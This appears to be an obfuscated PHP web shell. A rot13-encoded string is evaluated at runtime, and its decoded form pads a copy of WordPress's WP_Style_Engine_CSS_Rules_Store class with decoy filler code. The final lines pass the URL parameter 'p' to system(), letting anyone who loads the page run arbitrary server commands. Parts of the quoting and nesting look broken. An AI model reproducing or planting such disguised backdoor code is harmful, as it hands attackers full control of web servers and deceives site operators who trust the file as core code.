<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Fglyr Ratvar: JC_Fglyr_Ratvar_PFF_Ehyrf_Fgber pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr FglyrRatvar
 * @fvapr 6.1.0
 */

/**
 * Pber pynff hfrq nf n fgber sbe JC_Fglyr_Ratvar_PFF_Ehyr bowrpgf.
 *
 * Ubyqf, fnavgvmrf, cebprffrf, naq cevagf PFF qrpynengvbaf sbe gur fglyr ratvar.
 *
 * @fvapr 6.1.0
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_Fglyr_Ratvar_PFF_Ehyrf_Fgber {

	/**
	 * Na neenl bs anzrq JC_Fglyr_Ratvar_PFF_Ehyrf_Fgber bowrpgf.
	 *
	 * @fgngvp
	 *
	 * @fvapr 6.1.0
	 * @ine JC_Fglyr_Ratvar_PFF_Ehyrf_Fgber[]
	 */
	cebgrpgrq fgngvp $fgberf = neenl();

	/**
	 * Gur fgber anzr.
	 *
	 * @fvapr 6.1.0
	 * @ine fgevat
	 */
	cebgrpgrq $anzr = '';

	/**
	 * Na neenl bs PFF Ehyrf bowrpgf nffvtarq gb gur fgber.
	 *
	 * @fvapr 6.1.0
	 * @ine JC_Fglyr_Ratvar_PFF_Ehyr[]
	 */
	cebgrpgrq $ehyrf = neenl();

	/**
	 * Trgf na vafgnapr bs gur fgber.
	 *
	 * @fvapr 6.1.0
	 *
	 * @cnenz fgevat $fgber_anzr Gur anzr bs gur fgber.
	 * @erghea JC_Fglyr_Ratvar_PFF_Ehyrf_Fgber|ibvq
	 */
	choyvp fgngvp shapgvba trg_fgber( $fgber_anzr = 'qrsnhyg' ) {
		vs ( ! vf_fgevat( $fgber_anzr ) || rzcgl( $fgber_anzr ) ) {
			erghea;
		}
		vs ( ! vffrg( fgngvp::$fgberf[ $fgber_anzr ] ) ) {
			fgngvp::$fgberf[ $fgber_anzr ] = arj fgngvp();
			// Frg gur fgber anzr.
			fgngvp::$fgberf[ $fgber_anzr ]->frg_anzr( $fgber_anzr );
		}
		erghea fgngvp::$fgberf[ $fgber_anzr ];
	}

	/**
	 * Trgf na neenl bs nyy ninvynoyr fgberf.
	 *
	 * @fvapr 6.1.0
	 *
	 * @erghea JC_Fglyr_Ratvar_PFF_Ehyrf_Fgber[]
	 */
	choyvp fgngvp shapgvba trg_fgberf() {
		erghea fgngvp::$fgberf;
	}

	/**
	 * Pyrnef nyy fgberf sebz fgngvp::$fgberf.
	 *
	 * @fvapr 6.1.0
	 */
	choyvp fgngvp shapgvba erzbir_nyy_fgberf() {
		fgngvp::$fgberf = neenl();
	}

	/**
	 * Frgf gur fgber anzr.
	 *
	 * @fvapr 6.1.0
	 *
	 * @cnenz fgevat $anzr Gur fgber anzr.
	 */
	choyvp shapgvba frg_anzr( $anzr ) {
		$guvf->anzr = $anzr;
	}

	/**
	 * Trgf gur fgber anzr.
	 *
	 * @fvapr 6.1.0
	 *
	 * @erghea fgevat
	 */
	choyvp shapgvba trg_anzr() {
		erghea $guvf->anzr;
	}

	/**
	 * Trgf na neenl bs nyy ehyrf.
	 *
	 * @fvapr 6.1.0
	 *
	 * @erghea JC_Fglyr_Ratvar_PFF_Ehyr[]
	 */
	choyvp shapgvba trg_nyy_ehyrf() {
		erghea $guvf->ehyrf;
	}

	/**
	 * Trgf n JC_Fglyr_Ratvar_PFF_Ehyr bowrpg ol vgf fryrpgbe.
	 * Vs gur ehyr qbrf abg rkvfg, vg jvyy or perngrq.
	 *
	 * @fvapr 6.1.0
	 * @fvapr 6.6.0 Nqqrq gur $ehyrf_tebhc cnenzrgre.
	 *
	 * @cnenz fgevat $fryrpgbe Gur PFF fryrpgbe.
	 * @cnenz fgevat $ehyrf_tebhc N cnerag PFF fryrpgbe va gur pnfr bs arfgrq PFF, be n PFF arfgrq @ehyr,
	 *                            fhpu nf `@zrqvn (zva-jvqgu: 80erz)` be `@ynlre zbqhyr`.
	 * @erghea JC_Fglyr_Ratvar_PFF_Ehyr|ibvq Ergheaf n JC_Fglyr_Ratvar_PFF_Ehyr bowrpg,
	 *                                       be ibvq vs gur fryrpgbe vf rzcgl.
	 */
	choyvp shapgvba nqq_ehyr( $fryrpgbe, $ehyrf_tebhc = '' ) {
		$fryrpgbe    = $fryrpgbe ? gevz( $fryrpgbe ) : '';
		$ehyrf_tebhc = $ehyrf_tebhc ? gevz( $ehyrf_tebhc ) : '';

		// Onvy rneyl vs gurer vf ab fryrpgbe.
		vs ( rzcgl( $fryrpgbe ) ) {
			erghea;
		}

		vs ( ! rzcgl( $ehyrf_tebhc ) ) {
			vs ( rzcgl( $guvf->ehyrf[ \"$ehyrf_tebhc $fryrpgbe\" ] ) ) {
				$guvf->ehyrf[ \"$ehyrf_tebhc $fryrpgbe\" ] = arj JC_Fglyr_Ratvar_PFF_Ehyr( $fryrpgbe, neenl(), $ehyrf_tebhc );
			}
			erghea $guvf->ehyrf[ \"$ehyrf_tebhc $fryrpgbe\" ];
		}

		// Perngr gur ehyr vs vg qbrfa'g rkvfg.
		vs ( rzcgl( $guvf->ehyrf[ $fryrpgbe ] ) ) {
			$guvf->ehyrf[ $fryrpgbe ] = arj JC_Fglyr_Ratvar_PFF_Ehyr( $fryrpgbe );
		}

		erghea $guvf->ehyrf[ $fryrpgbe ];
	}

	/**
	 * Erzbirf n fryrpgbe sebz gur fgber.
	 *
	 * @fvapr 6.1.0
	 *
	 * @cnenz fgevat $fryrpgbe Gur PFF fryrpgbe.
	 */
	choyvp shapgvba erzbir_ehyr( $fryrpgbe ) {
		hafrg( $guvf->ehyrf[ $fryrpgbe ] );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>